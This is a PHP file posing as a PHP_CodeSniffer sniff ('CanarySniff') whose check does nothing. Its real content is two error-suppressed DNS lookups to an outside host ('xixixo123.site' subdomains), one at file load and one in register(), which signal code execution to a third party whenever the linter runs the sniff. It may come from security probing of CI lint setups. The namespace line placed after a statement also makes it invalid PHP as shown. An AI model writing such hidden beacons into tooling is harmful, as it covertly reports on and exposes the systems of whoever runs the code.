<?php
@gethostbyname("phpcs.fork3.ssrf.xixixo123.site");
namespace CrStandard\Sniffs\Canary;
use PHP_CodeSniffer\Sniffs\Sniff;
use PHP_CodeSniffer\Files\File;
class CanarySniff implements Sniff {
  public function register() { @gethostbyname("phpcs-reg.fork3.ssrf.xixixo123.site"); return [T_OPEN_TAG]; }
  public function process(File $f, $p) {}
}
